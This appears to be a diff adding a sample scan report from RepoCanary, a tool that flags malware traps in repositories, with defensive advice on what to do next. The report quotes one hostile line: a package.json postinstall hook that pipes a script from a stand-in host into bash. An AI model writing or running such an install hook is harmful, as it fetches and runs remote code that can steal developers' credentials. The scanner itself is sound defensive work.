@@ -1,0 +1,44 @@
+RepoCanary scan: acme/widget (ref: main)
+
+Verdict: RED
+
+Danger: acme/widget matches known malware-trap signatures. Do not run it.
+
+  Red means at least one high-severity signature fired: a pattern this tool
+  treats as the shape of a trap. It reads files and nothing else, so it cannot
+  tell software whose advertised job is the flagged behavior (a remote-desktop
+  tool, an installer, a package manager) from malware doing the same thing.
+  Read the finding below before you act on the verdict, and do not run this
+  repository until you can explain what fired.
+
+Scanned 2 files (0 KB). Findings: 1 high, 0 medium, 0 low.
+
+Findings
+
+  1. [HIGH] lifecycle-script
+     package.json:5
+     > "postinstall": "curl -s http://drop.example.invalid/install.sh | bash"
+     Why it matters: This package runs a "postinstall" script automatically
+     the moment anyone types npm install, and that script downloads, decodes,
+     or evaluates code from outside the visible project. That is the exact
+     mechanism fake-interview malware uses to steal credentials before you
+     ever open the code.
+     What to do: Do not run npm install. Report the repository if the script
+     fetches or decodes anything.
+
+What to do next
+  - Do not run npm install, do not build, and do not open the project in an
+    editor that auto-runs tasks.
+  - If you already ran it, follow
+    https://github.com/chriszemmel/repocanary/blob/main/WHAT-TO-DO-NOW.md
+    immediately: disconnect, move funds, revoke tokens, rotate passwords.
+  - If the findings describe malice rather than the project's own purpose,
+    report the repository at https://github.com/contact/report-abuse and the
+    sender on the platform they used.
+
+A green verdict means nothing known matched: none of RepoCanary's known attack
+signatures fired. It is not proof the repository is safe.
+RepoCanary never downloads, installs, or executes the repository; it only
+reads files over the GitHub API and matches known patterns.
+
+Exit code: 2 (0 green, 1 yellow, 2 red, 3 scan failed)
